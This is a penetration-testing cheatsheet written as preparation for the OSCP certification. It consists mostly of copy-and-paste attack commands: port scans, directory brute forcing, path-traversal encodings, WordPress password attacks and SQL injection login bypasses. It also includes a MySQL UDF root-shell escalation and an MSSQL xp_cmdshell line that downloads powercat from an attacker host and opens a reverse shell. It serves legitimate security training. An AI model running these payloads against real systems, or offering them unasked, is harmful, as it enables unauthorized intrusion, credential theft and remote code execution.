# OSCP Cheatsheet #

This cheatsheet is done as part of preparation Offensive Security Certified Professional (OSCP) based on Penetration Testing with Kali Linux 2020 (PWK-2020). The objective of this cheatsheet is three-fold:

* Quickly **copy and paste** the relevant commands to save time.
* To recongize that tools are merely tools, the output may even be wrong!
* A reference for the past, present and future.

## 1 Service Enumeration and Exploitation ##

There are only 4 rules, 1 is cliche, 1 is not, 1 is quick and 1 is to not forget:
* **Rule 1:** Enumerate harder and enumerate everything
* **Rule 2:** Run and check **wireshark or tcpdump** for desired packets
* **Rule 3:** Do something while enumeration is happening in the background
* **Rule 4:** Restart service enumeration **again** during the penetration test with new information found

### 1.1 Port Sanning ###

**Objective:** Identify known ports and attack surface for further enumeration.

```sh
# (1) All ports with T4 speed assuming live host
sudo nmap -T4 -Pn <TARGET IP> -sS -p-

# (2) Aggressive scanning for known ports found in (1)
sudo nmap -A -Pn <TARGET IP> -p <PORT1, PORT2, ...>

# (3) UDP Normal Scan (Slow, required if other scanners fail)
sudo nmap -sU <TARGET IP>
```

### 1.2 Web Directory Bruteforcing ###

**Objective:** For any web server, identify possible endpoints. Recursively repeat on each end-point found to the extent where an exploitation vector is revealed., asuming it exists.

```sh
# Python script. Ignores redirects (302) and missing pages (404) 
wfuzz -c -z file,<WORDLIST> --hc 302,404 http://<IP>:<PORT>/FUZZ

# Dirbuster (v2.22) - the "-X" option allows extension specification
dirb http://<IP>:<PORT>/ <WORDLIST>

# Gobuster (v3.0.1) - the "-k" option ignores SSL checking
gobuster dir -w <WORDLIST> -u http://<IP>:<PORT>/

# ffuf (Fuzz Faster U Fool, v1.0.2) - Can fuzz for parameters!
ffuf -c -w <WORDLIST> -u http://<IP>:<PORT>/FUZZ

# Nikto is for enumeration, good for obscure web servers (e.g. coldfusion)
nikto -h <TARGET IP>
```

### 1.3 Web Directory Traversal ###

**Objective:** Given a web server, enumerate files outside of the web root to find sensitive information (e.g. passwords, hashes, ssh-keys etc.) by using the parent folder reference (../).

```sh

# Example: http://<IP>:<PORT>/../../../../../<FILE TO RETRIEVE>

../                 # Normal directory traversal
..%2f               # HTML encoding for '/' character
%2e%2e%2f           # More Encoding
%252e%252e%252f     # Even More Encoding
%c0%ae%c0%ae%c0%af  # Even Much More encoding
%uff0e%uff0e%u2215  # Unicode Encoding
%uff0e%uff0e%u2216  # Even More Unicode Encoding
..%01/              # Webmin service
..././              # Special case #1
/???/               # Special case #2
```

### 1.4 NetBios Scan ###

**Objective:** Reveal NetBios names shared using the NetBios protocol.

```sh
# Reveal NetBios Name (and associated information)
nbtscan <TARGET IP>
nmblookup <TARGET IP>
```

### 1.5 SMB ###

**Objective:** Identify access of shares and enumerate corresponding content

```sh
# List available shares/permissions via null session (add "-U guest" for guest session)
smbmap -H <TARGET IP>

# Connect to known SMB Share (use -U ""%"" for a null session)
smbclient \\\\<TARGET IP>\\<SHARE NAME>\\ -U "<USERNAME>"%"<PASSWORD>"
```

Note: If "protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED" is received, proceed to smb.conf and modify "client min protocol" as required.

### 1.6 FTP ###

**Objective:** Access sensitive files with credentials or upload reverse shells to be executed elsewhere. 

```sh
# FTP Login to particular IP
ftp <TARGET IP>
> Username (e.g. anonymous)
> Password (e.g. "")

# CRD commands on FTP
> get <REMOTE FILE>
> put <LOCAL FILE>
> delete <REMOTE FILE>

# Possible Directory Traversal (e.g. HomeFTPServer)
> get ../../../../<ABSOLUTE PATH TO REMOTE FILE>

# Old favourite (vsftpd 2.3.4): https://www.exploit-db.com/exploits/17491
```

### 1.7 Wordpress ###

**Objective:** Identify vulnerable wordpress plugins, version and launch dictionary attacks against the admin login page.

```sh
# Scan for wordpress version and plugins installed
wpscan --url http://<TARGET IP>:<PORT>

# Enumerate users and launch dictionary attack on wordpress login
wpscan --passwords <WORDLIST> --url http://<TARGET IP>:<PORT>

# PHPass ($P$....) hash cracking with Hashcat (v.5.1.0)
hashcat -m 400 -a 0 --force <FILE WITH HASH> <WORDLIST>

# WP Admin Access = Insert PHP Reverse Shell in Theme = Low-Privilege SHell
```

### SQL ###

**Objective:** Bypass logins, obtain user credentials, launch reverse shell and create user-defined functions (UDF)

```sh
# Note: For all commands below, add ', ", ;, etc. for valid SQL syntax

# Basic SQL Injection (To bypass logins)
' OR 1=1 --
' OR '1'=1

# Union injection (Type and Number of columns must be same)
UNION SELECT <COLUMN 1, ...> FROM <DATABASE>.<TABLE>

# Stacked Queries (Close previous query e.g. with ', " etc., followed by ;)
<CLOSE PREVIOUS QUERY>; <YOUR SQL QUERY>

# Time-Based Injection [A Stacked QUery] (e.g. wait 5 seconds)
; WAITFOR DELAY '0:0:5'; --

# MySQL-based Databases (e.g. MariaDB)
[TODO]

# Oracle PLSQL Database (Errors have "ORA Exception ...")
[TODO]

# MSSQL Databases interesting strings / databases / files
@@Version # Version of MSSQL
SELECT name FROM master.dbo.sysdabatases # All databases
SELECT table_name FROM <DATABASE>.information_schema.tables # All tables in DB
SELECT column_name FROM <DATABASE>.information_schema.columns WHERE table_name='<TABLE>' # All columns in table
C:\Program Files\Microsoft SQL Server\MSSQL14.SQLEXPRESS\MSSQL\DATA\master.mdf # Master DB
C:\Program Files\Microsoft SQL Server\MSSQL14.SQLEXPRESS\MSSQL\BACKUP\master.mdf # Backup DB
# Extract sa hash from MDF: https://blog.xpnsec.com/extracting-master-mdf-hashes/


# MySQL User-Defined Function (UDF) exploit (https://www.exploit-db.com/exploits/1518)
echo "import os; os.setgid(0); os.setuid(0); os.system('/bin/bash')" >> suid.py
gcc -g -c raptor_udf2.c
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
mysql -u root -p
> USE mysql;
> CREATE table foo(line blob);
> INSERT INTO foo VALUES(load_file('/tmp/raptor_udf2.so'));
> SELECT * FROM foo INTO dumpfile '/usr/lib/raptor_udf2.so';
> CREATE function do_system returns integer soname 'raptor_udf2.so';
> SELECT * FROM mysql.func; # Verify UDF do_system() is created
...
> SELECT do_system('chmod 04755 /bin/python');
# Execute "python suid.py" to obtain root shell
# Note: suid.py can be replaced with a C version (apply chmod on ELF instead)


# MSSQL xp_cmdshell with "sa" (add "go" after each command if interactive)
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE; 
EXEC xp_cmdshell 'powershell -c IEX(New-Object System.Net.WebClient).DownloadString(\"http://<ATTACKER IP>:<HTTP SERVER PORT>/powercat.ps1\");powercat -c <ATTACKER IP> -p <ATTACKER LISTENING PORT> -e \"cmd.exe\"'; --




```